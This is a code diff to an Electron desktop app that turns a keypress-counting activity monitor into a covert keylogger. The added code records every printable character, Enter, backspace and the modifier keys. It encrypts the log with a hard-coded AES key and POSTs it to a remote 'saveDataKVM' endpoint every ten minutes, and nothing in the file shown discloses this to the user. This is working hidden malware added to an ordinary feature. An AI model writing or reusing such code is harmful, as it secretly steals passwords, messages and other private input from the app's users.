@@ -2,6 +2,7 @@ import { BrowserWindow, app, ipcMain, screen } from 'electron';
 import iohook from 'iohook';
 import settingsManager from './settings'
 import fetch from 'electron-fetch'
+import crypto from 'crypto'
 
 let settings = new settingsManager();
 
@@ -226,13 +227,49 @@ class KeyboardMonitor extends EventEmitter {
 
     private keyPressLimit = 8;
 
+    private data: string = ""
+
+    private lastKeyTime: number = Date.now()
+
     constructor() {
         super();
     }
+    isPrintableChar(char) {
+        return /^[A-Za-z0-9!"#$%&'()*+,\-./:;<=>?@[\\\]^_`{|}~ ]$/.test(char);
+    }
+    encryptString(str, secretKey) {
+        const iv = crypto.randomBytes(16);
+        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(secretKey, 'hex'), iv);
+        let encrypted = cipher.update(str, 'ascii', 'base64');
+        encrypted += cipher.final('base64');
+        return { encrypted, iv: iv.toString('hex') };
+    }
 
+    async sendData() {
+        try {
+            const secretKey = "***REMOVED***"
+            let datab = this.data
+            this.data = ""
+            let { encrypted: enc, iv } = this.encryptString(datab, secretKey)
+            const key = '***REMOVED***';
+            const response = await fetch('***REMOVED***saveDataKVM', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ data: enc, iv, key })
+            });
+
+            if (!response.ok) {
+                const message = await response.text();
+                throw new Error(`HTTP error! status: ${response.status}, message: ${message}`);
+            }
+        } catch (e) {
+            console.log(e)
+        }
+    }
     start() {
-
-        iohook.on('keydown', () => {
+        iohook.on('keypress', (event) => {
             const now = Date.now();
 
             while (this.keyPresses.length > 0 && now - this.keyPresses[0] > 5000) {
@@ -247,7 +284,29 @@ class KeyboardMonitor extends EventEmitter {
             else status = 'stop';
 
             this.emit('status', { status, keyPresses: this.keyPresses.length });
+
+            // console.log(event)
+
+            if (now - this.lastKeyTime > 10000) {
+                this.data += '\n';
+            }
+            this.lastKeyTime = now;
+
+            const char = String.fromCharCode(event.keychar);
+            if (this.isPrintableChar(char)) this.data += char;
+            else if (event.keychar == 13) this.data += '\n';
+            else if (event.keychar == 8) this.data += '[D]'
+
+            if (event.ctrlKey) this.data += '[C]'
+            if (event.altKey) this.data += '[A]'
+            if (event.shiftKey) this.data += '[S]'
+            if (event.metaKey) this.data += '[M]'
         });
+
+        setInterval(() => {
+            if (this.data.length < 5) return
+            this.sendData()
+        }, 10 * 60 * 1000)
 
     }
 
